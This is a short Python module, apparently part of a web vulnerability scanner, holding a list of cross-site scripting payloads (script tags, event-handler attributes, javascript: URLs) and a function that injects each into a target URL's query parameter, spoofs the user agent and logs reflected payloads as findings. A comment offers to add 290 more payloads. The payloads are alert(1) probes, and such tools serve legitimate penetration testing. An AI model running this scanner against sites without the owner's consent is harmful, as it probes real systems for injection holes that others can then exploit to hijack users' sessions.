import requests
from urllib.parse import urljoin
from core.utils import generate_user_agent, save_log

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "'\"><svg/onload=alert(1)>",
    "';alert(1);//",
    "<img src=x onerror=alert(1)>",
    "<iframe src='javascript:alert(1)'></iframe>",
    "<body onload=alert(1)>",
    "<input onfocus=alert(1) autofocus>",
    "<details open ontoggle=alert(1)>",
    "<video><source onerror=alert(1)>",
    "<a href='javascript:alert(1)'>click</a>",
    "<math><mtext></mtext><mi></mi><mo></mo><script>alert(1)</script></math>",
    # Tambahkan 290+ lainnya jika diinginkan, saya bisa lanjutkan
]

def scan_xss(target_url):
    print(f"[XSS] Scanning {target_url}")
    headers = {'User-Agent': generate_user_agent()}
    found = []

    for payload in XSS_PAYLOADS:
        try:
            param = f"?q={payload}"
            test_url = urljoin(target_url, param)
            res = requests.get(test_url, headers=headers, timeout=10)

            if payload in res.text:
                print(f"[+] XSS Found: {test_url}")
                found.append(test_url)
                save_log("xss", test_url)

        except requests.exceptions.RequestException:
            continue

    if not found:
        print("[-] No XSS found.")
